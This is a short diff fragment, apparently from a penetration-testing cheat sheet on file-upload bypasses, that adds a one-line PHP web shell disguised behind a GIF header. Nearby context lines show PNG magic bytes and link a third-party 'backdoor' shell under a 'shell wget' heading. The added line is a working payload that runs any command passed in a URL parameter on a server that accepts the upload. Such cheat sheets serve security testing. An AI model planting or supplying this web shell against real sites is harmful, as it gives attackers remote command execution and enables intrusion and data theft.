@@ -880,6 +880,9 @@ Content-Type: application/x-php
 ```
 89 50 4E 47 0D 0A 1A 0A
 ```
+```
+GIF89a; <?php system($_GET['cmd']); ?>
+```
 # shell wget 
 -
 -[shell](https://github.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor)
